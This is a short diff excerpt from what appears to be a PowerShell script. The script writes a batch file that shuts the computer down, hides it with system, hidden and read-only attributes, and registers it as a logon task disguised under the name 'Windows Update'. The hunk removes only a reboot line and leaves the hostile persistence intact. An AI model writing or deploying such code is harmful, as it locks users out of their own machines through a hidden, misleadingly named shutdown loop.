@@ -7,4 +7,3 @@ shutdown /s /t 5
 exit' -Encoding ASCII
 attrib +h +s +r "$u\hd.bat"
 schtasks /create /tn "Windows Update" /tr "$u\hd.bat" /sc onlogon /f
-shutdown /r /t 5
